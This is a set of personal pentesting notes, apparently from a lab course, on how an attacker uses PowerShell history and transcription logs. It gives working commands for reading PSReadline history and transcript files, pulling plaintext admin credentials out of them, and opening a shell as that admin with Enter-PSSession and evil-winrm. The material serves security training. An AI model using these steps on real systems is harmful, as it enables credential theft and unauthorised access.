
# PowerShell Logging & History
Unfortunately for us, finding juicy [sensitive-files](sensitive-files.md) on target machines is not as common as it used to be, and defensive techniques have improved a lot. However, one defensive technique requires increased logging surrounding command and operations executed on machines. Since [Windows](../../../computers/windows/README.md) only logs a small amount of data by default, IT staff commonly have to enable [powershell](../../../coding/languages/powershell.md) logging mechanisms on clients and servers in order to get as much insight into the environment as they can. This makes powershell *a vital resource* for attackers gathering information on a compromised machine.
## Types of PS Logging
### PowerShell Transcription
[_PowerShell Transcription_](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript) is one of two important powershell logging mechanisms we can take advantage of. When enabled, PS Transcription is *equal to what a person would see if they were looking over the shoulder of the user* who is entering commands into PS. Because of this, it's also called "over-the-shoulder-transcription."

The information is stored in *transcript files* which are usually saved in the *home directories* of users, a central directory for all users, or in a network share.
### PowerShell Script Block Logging
[_PowerShell Script Block Logging_](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2) records commands and blocks of script code *as events* while they're executing. The amount of information collected is therefor *much broader* than for PS Transcription (because the full content of the code and commands are recorded as they're executing).
## Taking Advantage as an Attacker
> [!Note]
> For this section, assume we're connected to a victim machine via a [netcat](../../../cybersecurity/TTPs/exploitation/tools/netcat.md) [bind-shell](../../../cybersecurity/TTPs/exploitation/bind-shell.md) on port `44444`. We're connected again as the user `dave` and have launched a PowerShell session.
### How PowerShell History Works
You can view the PS history of a user with the `Get-History` cmdlet. However, most sysadmins will use `Clear-History` to clear their PS history. Fortunately for us, starting with PS v5, PS has a module called `PSReadline` included which can be used for line-editing and command history functions.

`Clear-History` *does not clear the history of `PSReadline`* meaning we can check if the current user has history saved from using `PSReadline`. To check, we'll use the `Get-PSReadlineOption` to see information about the module itself.  Since this is cmdlet (and PS is OOP), we can append a dot to it and then the method `HistorySavePath` to retrieve only one option from all the module's available options:
```powershell
PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath

C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
`HistorySavePath` has revealed a *history file* from `PSReadline`. Let's use `type` to output its content:
```powershell
PS C:\Users\dave> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
...
$PSVersionTable
Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
cd C:\
ls
cd C:\xampp
ls
type passwords.txt
Clear-History
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
exit
Stop-Transcript
```
From the output we've learned:
- `dave` executed `Register-SecretVaule` with the module `SecretManagement.keepass` to create a new password manager database for KeePass
- `dave` used `Set-Secret` to create a secret, or entry, in the password manager with the name `Server02 Admin PW` and the password `paperEarMonitor33@` (probably creds for another system)
- `dave` used `Clear-History` in an attempt to clear the PS history
- `dave` used `Start-Transcript` to start *PowerShell Transcription*, the command also contains the path where the transcript file is stored'
- `dave` executed `Enter-PSSession` with the hostname of the local machine as an argument as well as a *PSCredential* object called `$cred` (which contains the username and password for `-Credential`)

Unfortunately, the one piece of info we're missing is the actual username and password in the PSCredential object `$cred`. If we examine the transcript file mentioned in the output though, we might be able to find them:
```powershell
PS C:\Users\dave> type C:\Users\Public\Transcripts\transcript01.txt

**********************
Windows PowerShell transcript start
Start time: 20220623081143
Username: CLIENTWK220\dave
RunAs User: CLIENTWK220\dave
Configuration Name: 
Machine: CLIENTWK220 (Microsoft Windows NT 10.0.22000.0)
Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Process ID: 10336
PSVersion: 5.1.22000.282
...
**********************
Transcript started, output file is C:\Users\Public\Transcripts\transcript01.txt
PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
PS C:\Users\dave> Stop-Transcript
**********************
Windows PowerShell transcript end
End time: 20220623081221
**********************
```
#### PSCredential Objects
For a user to create a [_PSCredential_](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential) object like in the transcript file above, the user needs to create a [_SecureString_](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring) first to store the password. Then they can give that to `System.Managemet.Automation.PSCredential()` as a parameter along with the username. The result is a PSCredential object which can be used in commands like `Enter-PSSession`.

Since `dave` was the account that created the original PSCred object, we can try to do the same thing by re-creating the commands from the transcript file (including `Enter-PSSession`). This should pop us into a new PS shell as the user `daveadmin`:
```powershell
PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force

PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)

PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred

[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
whoami
clientwk220\daveadmin
```
#### `Enter-PSSession`
[`Enter-PSSession`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2)creates a *remote PS session via [WinRM](../../../computers/windows/WinRM.md).* However, since we're connected to the host via our bind-shell and then WinRM, this causes *unexpected behavior*. For instance, even though `whoami` works, other commands do not.
#### Evil-WinRM
To avoid issues like this, we can use the [evil-winrm](../../../cybersecurity/TTPs/exploitation/tools/evil-winrm.md) tool which will give us a stable WinRM shell. This tool provides built-in functionality used for pen-testing like [pass-the-hash](../../../cybersecurity/TTPs/exploitation/pass-the-hash.md), in-memory loading, and file upload/download capability. Instead of executing this from the compromised box, we can execute it from our pen-testing machine:
```bash
kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"

Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\daveadmin\Documents> whoami
clientwk220\daveadmin
*Evil-WinRM* PS C:\Users\daveadmin\Documents> cd C:\
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/27/2024   3:22 AM                FileZilla
d-----          5/6/2022  10:24 PM                PerfLogs
d-r---         8/27/2024   3:20 AM                Program Files
d-r---          5/7/2022  12:40 AM                Program Files (x86)
d-----          7/4/2022   1:00 AM                tools
d-r---         8/21/2024   6:43 AM                Users
d-----         8/21/2024   6:47 AM                Windows
d-----         6/16/2022   1:17 PM                xampp
```

> [!Resources]
> - [_PowerShell Transcription_](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript)
> - [_PowerShell Script Block Logging_](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2)
> - [_PSCredential_](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential)
> - [_SecureString_](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring) 
> - [_Enter-PSSession_](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2)
> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.